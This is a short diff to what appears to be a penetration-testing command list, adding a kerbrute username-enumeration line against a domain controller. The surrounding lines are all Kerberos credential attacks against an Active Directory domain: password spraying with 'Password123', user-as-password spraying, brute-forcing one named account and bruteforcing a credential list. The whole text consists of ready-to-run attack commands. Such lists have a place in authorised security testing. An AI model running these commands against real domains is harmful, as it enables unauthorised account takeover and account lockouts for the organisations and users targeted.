@@ -3,3 +3,4 @@ kerbrute passwordspray --domain "$DOMAIN" domain_users.txt Password123
 kerbrute passwordspray --user-as-pass --domain "$DOMAIN" domain_users.txt
 kerbrute bruteuser --domain "$DOMAIN" passwords.lst thoffman
 kerbrute bruteforce --domain "$DOMAIN" user_password.lst
+kerbrute userenum --domain "$DOMAIN" usernames.txt --dc "$DC_IP"
